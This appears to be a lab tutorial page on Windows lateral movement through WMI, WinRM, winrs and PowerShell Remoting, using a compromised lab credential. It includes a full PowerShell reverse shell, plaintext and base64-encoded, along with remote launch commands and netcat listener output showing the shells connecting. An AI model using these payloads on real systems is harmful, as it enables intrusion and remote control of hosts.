---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# WMI, WinRS, and WinRM

This lateral movement technique is based on [**Windows Management Instrumentation**](../../core-concepts/common-information-model-cim.md#windows-management-instrumentation) (**WMI**), which is an object-oriented feature that facilitates task automation.

WMI is capable of creating processes via the `Create` method from the `Win32_Process` class. It communicates through [Remote Procedure Calls](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) (RPC) over port `135` for remote access and uses a higher-range port (`19152-65535`) for session data.

## Example Background

The example assumes the attacker has compromised an account (`jeff`) and is able to access the `CLIENT74` machine (`192.168.x.74`) with that login. The attacker is now attempting to move laterally to the `FILES04` machine (`192.168.x.73`).

Also assume the attacker has access to the `jen:Nexus123!` account and credentials as they were compromised in [this example](../authentication/attacking-ad-authentication/password-attacks.md).

This method used to be primarily conducted via `wmic` utility, but that has been [recently deprecated](https://docs.microsoft.com/en-us/windows/deployment/planning/windows-10-deprecated-features). Regardless, the demonstration will start with `wmic` and then show the same technique in PowerShell. Then an alternative technique leveraging WinRM can will be shown.

## WMIC

[**Windows Management Instrumentation Command-line**](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic) (**WMIC**) utility, provides a command-line interface for WMI. `wmic` is compatible with existing shells and utility commands. See [here](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc779482\(v=ws.10\)) for detailed instructions on using `wmic`.

Historically, `wmic` has been abused for lateral movement via the command line by specifying the following arguments in the call:

* `/node:` IP of the target machine
* `/user:` username for login to `/node:` (must be an Administrator on `/node:`)
* `/password:` password for `/user:`

For example, in order to start a `calc.exe` process on a target machine the wmic command would be:

{% code overflow="wrap" %}
```sh
wmic /node:192.168.188.73 /user:jen /password:Nexus123! process call create "calc"
```
{% endcode %}

This attempts to open the calculator on `FILES04` (`192.168.x.73`) as the user `jen:Nexus123!`.&#x20;

To create a process on the remote target via WMI, the attacker will need the credentials of a member of the `Administrators` local group (on the target machine), which can also be a domain user. Assume the attacker was also able to compromise the account jen:Nexus123!. This account happens to be a member of the Administrators group on the target FILES04 machine:

```powershell
PS C:\Users\jeff> Find-LocalAdminAccess -Credential $Cred | Select Name,DnsHostname

Name     DnsHostname
----     -----------
web04    web04.corp.com
files04  FILES04.corp.com
client76 CLIENT76.corp.com
```

When run the above command's output looks like this:

```shell-session
C:\Users\jeff>wmic /node:192.168.188.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 2156;
        ReturnValue = 0;
};
```

&#x20;The WMI job returned the PID of the newly created process and a return value of `0`, meaning that the process has been created successfully. If one were logged in on that machine and monitoring _Task Manager_ they would see the `win32calc.exe` process appear with `jen` as the user.

System processes and services always run in session 0 ([source](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361)) as part of session isolation, which was introduced in Windows Vista. Because the WMI Provider Host is running as a system service, the newly created processes through WMI are also spawned in session 0.

### PowerShell

The same functionality can be replicated in PowerShell. It leverages the [`New-CimSession`](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2) cmdlet to create a CIM session. The basic steps are shown below:

#### Creating Credential Object

The first step is to create a credential object for connecting to the target. The credential object is created like this:

```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

As noted above the user must be an Administrator on the target machine. Fortunately `jen` is an Administrator on `FILES04`.

#### Generating the Shell Payload

In order to avoid escaping characters it is best to encode the reverse shell launcher command to base64. Prior to encoding the command looks like this:

{% code overflow="wrap" %}
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

* `10.10.10.2` and `443` should be substituted for the actual IP and port of the reverse shell listener

This is then encoded to base64 and appended to a `powershell -enc` call:

{% code overflow="wrap" %}
```powershell
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAyACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```
{% endcode %}

This string is then saved to be used as a command:

```powershell
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAyACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';
```

#### Opening a CIM Session

A CIM Session is launched with the commands:

```powershell
$Options = New-CimSessionOption -Protocol DCOM;
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

`New-CimSession` opens a CIM Session to the target machine 192.168.50.73 using the credential object created [above](wmi-winrs-and-winrm.md#creating-credential-object). [`Invoke-CimMethod`](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/invoke-cimmethod?view=powershell-7.4) is then used to run a command on the machine. The command run is the reverse shell command generated [above](wmi-winrs-and-winrm.md#generating-the-shell-payload). The complete script would look like this:

```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAyACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';

$Options = New-CimSessionOption -Protocol DCOM;
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

This script is not the most practical to use and largely serves illustration purposes.

#### Move-AD

[`Move-AD`](https://github.com/alex-christine/OSCP\_Exercises/blob/main/Utilities/Tools/Move-AD.psm1) is a PowerShell module I wrote to automate this process. Once imported, it offers the cmdlet `Invoke-ReverseShell` which can be used as follows:

{% code overflow="wrap" %}
```powershell
Invoke-ReverseShell -Target "files04" -IP "192.168.45.202" -Port 8080 -CreateWith 'wmi' -Username "jen" -Password 'Nexus123!'
```
{% endcode %}

Alternatively, a `PSCredential` object can be created and passed into the cmdlet:

```powershell
$SecPassword = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('corp\jen', $SecPassword)
Invoke-ReverseShell 'files04' '192.168.45.202' 8080 -CreateWith 'wmi' -Credential $Cred
```

Prior to running the command, the attacker must start a listener on their machine:

```bash
rlwrap nc -lvnp 8080
```

In the example, this command would be run from `CLIENT74` as `jeff` but it is targeting `FILES04` (as `jen`). From the attacker's RDP session as jeff on `CLIENT74` nothing is returned and this would look like:

```powershell
PS C:\Users\jeff> Invoke-ReverseShell -Target "files04" -IP "192.168.45.202" -Port 8080 -CreateWith 'wmi' -Username "jen" -Password 'Nexus123!'
PS C:\Users\jeff>
```

Checking the listener indicates the shell did indeed connect:

```shell-session
kali@kali:~$ rlwrap nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.188.73] 49520

PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID                                           Attributes                                                     
==================================== ================ ============================================= ===============================================================
Everyone                             Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators               Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                        Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group             
CORP\Development Department          Group            S-1-5-21-1987370270-658905905-1781884369-1127 Mandatory group, Enabled by default, Enabled group             
CORP\Sales Department                Group            S-1-5-21-1987370270-658905905-1781884369-1125 Mandatory group, Enabled by default, Enabled group             
CORP\Management Department           Group            S-1-5-21-1987370270-658905905-1781884369-1126 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

The output indicates that the shell is running as `jen` who is indeed a member of the `BUILTIN\Administrators` group.

## WinRM

WinRM can be employed for remote host management. WinRM is the Microsoft version of the [**WS-Management**](https://en.wikipedia.org/wiki/WS-Management) protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port `5986` for encrypted HTTPS traffic and port `5985` for plain HTTP. WinRM is implemented in numerous built-in Windows utilities including [`winrs`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (Windows Remote Shell).

### winrs

`winrs` can be used to run commands on a remote machine. In order to leverage WinRM, via `winrs` or any other implementation, the domain user needs to be part of the `Administrators` or `Remote Management Users` group on the target host. Fortunately as discovered earlier, `jen` is a member of `Administrators` on several domain machines.

The basic command structure for `winrs` is:

```sh
winrs /r:target /u:user /p:password  command
```

For example to run the the `hostname` and `whoami` commands on `files04` via `winrs` as `jen:Nexus123!` the command would be:

```sh
winrs /r:files04 /u:jen /p:Nexus123! "cmd /c hostname & whoami"
```

* winrs will do machine name resolution so the target can be specified as files04
* `cmd /c hostname & whoami` opens `cmd.exe` and passes commands via the command line with the `/c` flag

When run by the attacker from `CLIENT74` (signed in as `jeff`) the output looks like this:

```shell-session
C:\Users\jeff>winrs /r:files04 /u:jen /p:Nexus123! "cmd /c hostname & whoami"
FILES04
corp\jen
```

The same PowerShell command from [above](wmi-winrs-and-winrm.md#generating-the-shell-payload) can be used to to invoke the creation of a reverse shell:

```sh
winrs /r:files04 /u:jen /p:Nexus123! 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAyACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

When run it does indeed generate the  reverse shell:

```shell-session
kali@kali:~$ rlwrap nc -lvnp 8080   
listening on [any] 8080 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.209.73] 57713

PS C:\Users\jen> whoami
corp\jen
PS C:\Users\jen> hostname
FILES04
```

### PowerShell

PowerShell also has an implementation for WinRM. Fortunately it is actually even simpler. The common [`Invoke-Command`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7.4) cmdlet relies on WinRM under-the-hood when a remote machine is provided via the `-ComputerName` argument:

```powershell
$SecPassword = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('corp\jen', $SecPassword)
Invoke-Command -ComputerName 'files04' -Credential $Cred -ScriptBlock { whoami }
```

* Whatever is provided in `-ScriptBlock` will be executed on the target machine. In this instance it is simply the `whoami` command

The above command would attempt to run `whoami` on the machine `FILES04` as `jen`.

The remote machine provided must be a member of the WinRM trusted hosts list for the current machine. If needed the following command can be used to add modify the WinRM trusted hosts list:

```powershell
Set-Item WSMan:\localhost\Client\TrustedHosts -Value 'machineA'
```

* User must be Administrator on machine to run this
* Multiple machines may be specified. E.g. `-Value 'machineA,machineB'`

If issues are seen, [this](https://woshub.com/invoke-command-run-powershell-scripts-remotely/) post explains more details around the usage of WinRM via PowerShell.

#### Move-AD

[`Move-AD`](https://github.com/alex-christine/OSCP\_Exercises/blob/main/Utilities/Tools/Move-AD.psm1)'s Invoke-ReverseShell cmdlet can also be used with WinRM. The only difference is the `-CreateWith` argument value should be `winrm` instead of `wmi` or left blank:

{% code overflow="wrap" %}
```powershell
Invoke-ReverseShell -Target "files04" -IP "192.168.45.202" -Port 8080 -CreateWith 'winrm' -Username "jen" -Password 'Nexus123!'
```
{% endcode %}

The command is almost exactly the same as [WMIC example](wmi-winrs-and-winrm.md#move-a-d), the cmdlet automatically switches between WMIC and WinRM based on the `-CreateWith` flag. Under-the-hood it is simply using the Invoke-Command snippet seen [above](wmi-winrs-and-winrm.md#powershell-1). When run there is no output but a listener opened would find an incoming shell:

```powershell
PS C:\Users\jeff> Invoke-ReverseShell -Target "files04" -IP "192.168.45.202" -Port 8080 -CreateWith 'winrm' -Username "jen" -Password 'Nexus123!'
PS C:\Users\jeff>
```

```shell-session
kali@kali:~$ rlwrap nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.45.202] from (UNKNOWN) [192.168.209.73] 57790

PS C:\Users\jen\Documents> whoami
corp\jen
PS C:\Users\jen\Documents> hostname
FILES04
```

### PowerShell Remoting

PowerShell also has WinRM built-in capabilities called [**PowerShell remoting**](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2), which can be invoked via the [`New-PSSession`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.4) cmdlet by providing the IP of the target host along with the credentials in a credential object:

```powershell
New-PSSession -ComputerName name -Credential $CredObject
```

In the context of the example this would be used as follows:

```powershell
$SecPassword = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('corp\jen', $SecPassword)
$Session = New-PSSession -ComputerName files04 -Credential $Cred
```

If the `PSSession` object is not saved as a variable the output will indicate the ID of the created session:

```powershell
PS C:\Users\jeff> New-PSSession -ComputerName files04 -Credential $Cred

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM2          files04         RemoteMachine   Opened        Microsoft.PowerShell     Available
```

To interact with the session the [`Enter-PSSession`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.4) cmdlet is used:

```powershell
Enter-PSSession $Session
```

* `$Session` can be either a `PSSession` object or a session ID

This allows running PowerShell commands as if the attacker were a local user:

```powershell
PS C:\Users\jeff> $Session = New-PSSession -ComputerName files04 -Credential $Cred
PS C:\Users\jeff> Enter-PSSession $Session
[files04]: PS C:\Users\jen\Documents> whoami
corp\jen
[files04]: PS C:\Users\jen\Documents> hostname
FILES04
```

Once the attacker is done running commands the session can be exited with the [`Exit-PSSession`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/exit-pssession?view=powershell-7.4) cmdlet:

```powershell
Exit-PSSession
```

```powershell
PS C:\Users\jeff> Enter-PSSession $Session
[files04]: PS C:\Users\jen\Documents> whoami
...
[files04]: PS C:\Users\jen\Documents> Exit-PSSession
PS C:\Users\jeff>
```

#### Enable PowerShell Remoting

In order for this to work PowerShell Remoting must be enabled on the target machine. When PowerShell Remoting is not enabled a session creation attempt fails with the error:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>PS C:\Users\jeff> $Session = New-PSSession -ComputerName client75 -Credential $Cred
</strong>New-PSSession : [client75] Connecting to remote server client75 failed with the following error message : Access is denied. For more information, see the about_Remote_Troubleshooting Help topic.
</code></pre>

If the attacker has access to the machine this can be done with the [`Enable-PSRemoting`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.4) cmdlet:

```powershell
Enable-PSRemoting
```

The user must be an Administrator to run this cmdlet:

```powershell
PS C:\Users\jeff> Enable-PSRemoting
Enable-PSRemoting : Access is denied. To run this cmdlet, start Windows PowerShell with the "Run as administrator" option.
...
```

But if run on `FILES04` as `jen` the cmdlet works fine:

```powershell
PS C:\Users\jen> Enable-PSRemoting
PS C:\Users\jen> 
```

PowerShell Remoting can be disabled with [`Disable-PSRemoting`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/disable-psremoting?view=powershell-7.4) if desired.
